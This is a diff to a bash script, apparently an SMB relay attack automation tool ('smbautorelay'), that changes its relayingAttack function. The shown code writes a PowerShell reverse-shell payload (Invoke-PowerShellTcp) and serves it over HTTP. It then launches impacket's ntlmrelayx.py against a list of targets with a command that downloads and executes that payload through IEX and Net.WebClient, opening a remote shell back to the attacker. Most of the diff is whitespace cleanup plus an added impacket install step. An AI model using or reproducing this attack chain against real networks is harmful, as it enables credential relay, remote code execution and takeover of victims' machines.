@@ -261,7 +261,7 @@ function relayingAttack(){
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Creating Tmux session 'smbautorelay'...\n"; sleep 0.5; fi
 	tmux new-session -d -t "smbautorelay" &>/dev/null
 	if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
-	
+
 	tmux rename-window "smbautorelay" &>/dev/null && tmux split-window -h &>/dev/null
 	if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
 
@@ -297,18 +297,21 @@ function relayingAttack(){
 		echo 'Invoke-PowerShellTcp -Reverse -IPAddress '$lhost' -Port '$lport >> $(pwd)/shell.ps1
 	fi
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.5; fi
-	
+
 	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "python3 -m http.server" C-m &>/dev/null && sleep 1 && tmux split-window &>/dev/null
 	if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
-	
+
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
-	
-    	command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
+
+	python3 $(pwd)/ntlmrelayx.py -h &>/dev/null
+	if [ $? -ne 0 ];then python3 -m pip install -q impacket &>/dev/null; fi
+
+	command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
 	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m &>/dev/null
 	if [ $? -ne 0 ];then bTmux; else sleep 1; fi
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} port $lport open to receive the connection\n"; sleep 0.5; fi
-	
+
 	terminal='xterm'
 	for ps in $(ps ax | awk '{print $5}' | sort -u | grep -v "\[\|\/" | awk -F- '{print $1}'); do
 		tput -T $ps longname &>/dev/null
